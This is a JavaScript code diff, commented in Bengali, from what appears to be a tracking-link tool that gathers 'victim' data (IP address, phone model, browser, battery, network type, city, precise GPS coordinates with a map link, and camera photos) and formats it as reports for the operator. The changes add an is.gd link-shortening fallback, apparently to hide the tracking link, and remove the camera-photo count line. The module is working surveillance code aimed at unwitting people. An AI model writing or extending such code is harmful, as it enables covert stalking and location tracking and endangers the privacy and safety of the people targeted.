@@ -135,27 +135,31 @@ async function getUserProfile(senderId) {
 }
 
 // ================================================================
-// লিংক শর্ট করা
+// লিংক শর্ট করা (ব্যর্থ হলে আসল লিংক)
 // ================================================================
 async function shortenUrl(longUrl) {
     try {
         const response = await axios.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(longUrl)}`, {
             timeout: 5000
         });
-        return response.data.trim();
+        const shortUrl = response.data.trim();
+        if (shortUrl.startsWith('Error')) {
+            console.warn('⚠️ is.gd শর্ট করতে ব্যর্থ:', shortUrl);
+            return longUrl;
+        }
+        return shortUrl;
     } catch (err) {
-        console.error('Shorten error:', err.message);
+        console.warn('⚠️ is.gd API ডাউন বা টাইমআউট:', err.message);
         return longUrl;
     }
 }
 
 // ================================================================
-// 🆕 ফোনের মডেল বের করার ফাংশন (ঠিক করা)
+// ফোনের মডেল বের করা
 // ================================================================
 function getDeviceModel(device) {
     const ua = device.userAgent || '';
     
-    // Android: (Linux; Android 11; vivo 1906 Build/RP1A.200720.012)
     let match = ua.match(/\([^;]+;\s*[^;]+;\s*([^;\)]+)/);
     if (match) {
         let model = match[1].trim();
@@ -165,11 +169,9 @@ function getDeviceModel(device) {
         return model;
     }
     
-    // iOS: (iPhone; CPU iPhone OS 15_0 like Mac OS X)
     match = ua.match(/\(([^;\)]+); CPU iPhone OS/);
     if (match) return match[1].trim();
     
-    // Windows: (Windows NT 10.0; Win64; x64)
     match = ua.match(/\(Windows NT [^;]+;\s*([^;\)]+)/);
     if (match) return match[1].trim();
     
@@ -177,42 +179,40 @@ function getDeviceModel(device) {
 }
 
 // ================================================================
-// ভিক্টিম ডেটা ফরম্যাট (মডেল ঠিক করা)
+// ভিক্টিম ডেটা ফরম্যাট (ক্যামেরা লাইন বাদ)
 // ================================================================
 function formatVictimData(victim) {
     const d = victim.device || {};
     const deviceTime = new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' });
     
-    let msg = '✅ *ভিক্টিমের তথ্য পাওয়া গেছে!*\n\n';
-    msg += `⚓️ *আইপি অ্যাড্রেস:* ${victim.ip || 'N/A'}\n`;
-    msg += `🕐 *সময়:* ${deviceTime}\n\n`;
+    let msg = '✅ ভিক্টিমের তথ্য পাওয়া গেছে!\n\n';
+    msg += `⚓️ আইপি অ্যাড্রেস: ${victim.ip || 'N/A'}\n`;
+    msg += `🕐 সময়: ${deviceTime}\n\n`;
     
-    // 🆕 ঠিক করা মডেল
     const model = getDeviceModel(d);
-    msg += `📱 *ফোনের মডেল:* ${model}\n`;
+    msg += `📱 ফোনের মডেল: ${model}\n`;
     
     const browser = d.userAgent?.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[0-9.]+/)?.[0] || 'N/A';
-    msg += `🌐 *ব্রাউজার:* ${browser}\n`;
-    msg += `👆 *টাচ পয়েন্ট:* ${d.maxTouchPoints || 0}\n`;
-    msg += `🗣️ *ভাষা:* ${d.language || 'N/A'}\n\n`;
+    msg += `🌐 ব্রাউজার: ${browser}\n`;
+    msg += `👆 টাচ পয়েন্ট: ${d.maxTouchPoints || 0}\n`;
+    msg += `🗣️ ভাষা: ${d.language || 'N/A'}\n\n`;
     
     const b = victim.battery || {};
-    msg += `🔋 *চার্জ:* ${b.level || 'N/A'}%\n`;
-    msg += `⚡ *চার্জ হচ্ছে:* ${b.charging ? 'হ্যাঁ' : 'না'}\n\n`;
+    msg += `🔋 চার্জ: ${b.level || 'N/A'}%\n`;
+    msg += `⚡ চার্জ হচ্ছে: ${b.charging ? 'হ্যাঁ' : 'না'}\n\n`;
     
     const n = victim.network || {};
     const connectionType = n.type || 'N/A';
-    msg += `📶 *কানেকশন:* ${connectionType === 'wifi' ? '📶 ওয়াইফাই' : connectionType === 'cellular' ? '📱 মোবাইল ডেটা' : connectionType}\n\n`;
+    msg += `📶 কানেকশন: ${connectionType === 'wifi' ? '📶 ওয়াইফাই' : connectionType === 'cellular' ? '📱 মোবাইল ডেটা' : connectionType}\n\n`;
     
     if (victim.location && victim.location.city) {
-        msg += `📍 *আনুমানিক অবস্থান:* ${victim.location.city}, ${victim.location.country}\n`;
+        msg += `📍 আনুমানিক অবস্থান: ${victim.location.city}, ${victim.location.country}\n`;
     } else {
-        msg += `📍 *আনুমানিক অবস্থান:* N/A\n`;
+        msg += `📍 আনুমানিক অবস্থান: N/A\n`;
     }
     
-    if (victim.type !== 'location' && victim.camera && victim.camera.length > 0) {
-        msg += `\n📸 *ক্যামেরা ছবি:* ${victim.camera.length}টি (ছবি আলাদাভাবে আসছে)`;
-    }
+    // ❌ "📸 ক্যামেরা ছবি: Xটি" লাইনটি সম্পূর্ণ সরানো হয়েছে। 
+    // শুধু ডিভাইস ইনফো থাকবে, ছবি আলাদাভাবে মেসেঞ্জারে যাবে।
     
     msg += `\n\n🆔 ভিক্টিম আইডি: ${victim.id}`;
     return msg;
@@ -225,13 +225,16 @@ function formatLocationMessage(gpsLocation) {
     if (!gpsLocation || !gpsLocation.latitude) return null;
     const mapLink = gpsLocation.googleMaps || 
         `https://www.google.com/maps?q=${gpsLocation.latitude},${gpsLocation.longitude}`;
-    return `📍 *লোকেশন পারমিশন দেওয়া হয়েছে!*\n\n` +
+    return `📍 লোকেশন পারমিশন দেওয়া হয়েছে!\n\n` +
            `📌 অক্ষাংশ: ${gpsLocation.latitude}\n` +
            `📌 দ্রাঘিমাংশ: ${gpsLocation.longitude}\n` +
            `🎯 নির্ভুলতা: ${gpsLocation.accuracy} মিটার\n\n` +
            `🔗 গুগল ম্যাপ: ${mapLink}`;
 }
 
+// ================================================================
+// এক্সপোর্ট
+// ================================================================
 module.exports = {
     getConfig,
     getLocalConfig,
